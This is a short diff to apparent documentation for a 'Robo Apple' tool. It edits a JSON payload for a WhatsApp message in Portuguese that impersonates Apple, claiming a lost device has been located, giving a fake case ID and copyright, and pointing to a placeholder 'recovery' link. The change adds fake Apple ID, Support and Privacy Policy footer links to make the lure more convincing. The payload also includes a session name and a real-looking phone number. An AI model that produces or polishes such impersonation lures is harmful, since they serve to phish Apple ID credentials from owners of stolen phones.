@@ -605,8 +605,8 @@ To replicate the "Robo Apple" behavior perfectly, use the following payload stru
 {
   "session": "thiago",
   "number": "5541995810993",
-  "message": "*Dispositivo Localizado*\n> Dispositivo: *{modelo} {cor} {capacidade}*\n> Número de emergencia: *({numero})*\n> ID de caso: *000-A946*\nPara iniciar o processo de recuperação, digite *Ajuda*\n> *Copyright ©️ 2025 Apple Inc*",
-  "mediaPath": "uploads/sua-imagem.png",
+  "message": "*Dispositivo Localizado*\n> Dispositivo: *{modelo} {cor} {capacidade}*\n> Número de emergencia: *({numero})*\n> ID de caso: *000-A946*\nPara iniciar o processo de recuperação, digite *Ajuda*\n> *Copyright ©️ 2025 Apple Inc*\n> | Apple ID | Support | Privacy Policy",
+  "mediaPath": "uploads/Dynamic.png",
   "trackLink": "https://seu-link-de-recuperacao.com",
   "language": "pt"
 }
